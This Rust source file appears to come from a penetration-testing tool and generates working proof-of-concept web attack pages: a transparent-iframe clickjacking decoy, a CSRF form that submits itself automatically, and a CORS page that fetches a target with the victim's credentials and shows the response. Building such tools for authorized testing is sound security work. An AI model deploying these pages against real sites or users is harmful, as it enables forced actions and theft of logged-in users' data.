/// Generate a clickjacking PoC HTML page that iframes the target URL.
/// Mirrors Burp Suite's Clickbandit tool.
///
/// The generated HTML creates a transparent iframe overlaying a decoy
/// page, so a victim clicking the visible UI actually clicks the target
/// button at the specified coordinates.
pub fn clickjacking_poc(target_url: &str, width: u32, height: u32) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head>
<title>Clickjacking PoC — BurpFree</title>
<style>
body {{ margin: 0; padding: 20px; font-family: sans-serif; }}
.decoy {{ position: relative; width: {width}px; height: {height}px; }}
.decoy iframe {{
    position: absolute;
    top: 0; left: 0;
    width: {width}px;
    height: {height}px;
    opacity: 0.0001;
    z-index: 2;
    border: none;
}}
.decoy .bait {{
    position: absolute;
    top: 0; left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    background: #f0f0f0;
    border: 2px dashed #ccc;
    font-size: 18px;
    color: #333;
    cursor: pointer;
}}
.controls {{ margin-top: 20px; font-size: 14px; }}
.controls label {{ margin-right: 10px; }}
.controls input[type=range] {{ width: 200px; vertical-align: middle; }}
h1 {{ font-size: 16px; color: #d44; }}
.note {{ font-size: 12px; color: #888; margin-top: 10px; }}
</style>
</head>
<body>
<h1>Clickjacking PoC</h1>
<p>Target: <code>{target_url}</code></p>
<div class="decoy">
    <div class="bait">Click here to win a prize!</div>
    <iframe src="{target_url}" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
</div>
<div class="controls">
    <label>Opacity:
        <input type="range" min="0" max="100" value="0"
               oninput="document.querySelector('iframe').style.opacity = this.value/100">
    </label>
    <label>
        <input type="checkbox" onchange="document.querySelector('iframe').style.pointerEvents = this.checked ? 'none' : 'auto'">
        Disable iframe clicks (reveal decoy)
    </label>
</div>
<div class="note">
    Generated by BurpFree Clickbandit. Adjust the opacity slider to
    visualize the overlay. This PoC demonstrates that the target page
    can be framed — it does NOT prove exploitation without a specific
    sensitive action at the click coordinates.
</div>
<script>
// Log clicks for recording
document.querySelector('.decoy').addEventListener('click', function(e) {{
    console.log('Click at', e.offsetX, e.offsetY);
}});
</script>
</body>
</html>"#,
        target_url = target_url,
        width = width,
        height = height,
    )
}

/// Generate a CSRF PoC HTML form that auto-submits to the target.
pub fn csrf_poc(
    target_url: &str,
    method: &str,
    params: &[(&str, &str)],
) -> String {
    let fields: String = params
        .iter()
        .map(|(k, v)| {
            format!(
                "    <input type=\"hidden\" name=\"{}\" value=\"{}\" />",
                html_escape(k),
                html_escape(v)
            )
        })
        .collect::<Vec<_>>()
        .join("\n");

    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CSRF PoC — BurpFree</title></head>
<body>
<h1>CSRF PoC</h1>
<p>Target: <code>{url}</code> ({method})</p>
<form id="csrf-form" action="{url}" method="{method}">
{fields}
    <input type="submit" value="Submit" />
</form>
<script>
// Auto-submit after 1 second
setTimeout(function() {{ document.getElementById('csrf-form').submit(); }}, 1000);
</script>
<div style="font-size:12px;color:#888;margin-top:20px;">
Generated by BurpFree. The form auto-submits after 1 second.
</div>
</body>
</html>"#,
        url = target_url,
        method = method.to_uppercase(),
        fields = fields,
    )
}

/// Generate a CORS exploitation PoC that reads cross-origin data.
pub fn cors_poc(target_url: &str) -> String {
    format!(
        r#"<!DOCTYPE html>
<html>
<head><title>CORS PoC — BurpFree</title></head>
<body>
<h1>CORS Exploitation PoC</h1>
<p>Target: <code>{url}</code></p>
<div id="result" style="white-space:pre;font-family:monospace;background:#f0f0f0;padding:10px;margin-top:10px;max-height:400px;overflow:auto;">
Fetching...
</div>
<script>
fetch('{url}', {{ credentials: 'include' }})
  .then(r => r.text())
  .then(text => {{
    document.getElementById('result').textContent = 'Response (' + text.length + ' bytes):\n\n' + text;
  }})
  .catch(err => {{
    document.getElementById('result').textContent = 'Error: ' + err.message + '\n\nThe server may not allow cross-origin requests from this origin.';
  }});
</script>
<div style="font-size:12px;color:#888;margin-top:20px;">
Generated by BurpFree. If the response body appears above, the target
has a permissive CORS configuration that allows cross-origin data theft.
</div>
</body>
</html>"#,
        url = target_url,
    )
}

fn html_escape(s: &str) -> String {
    s.replace('&', "&amp;")
        .replace('<', "&lt;")
        .replace('>', "&gt;")
        .replace('"', "&quot;")
        .replace('\'', "&#x27;")
}


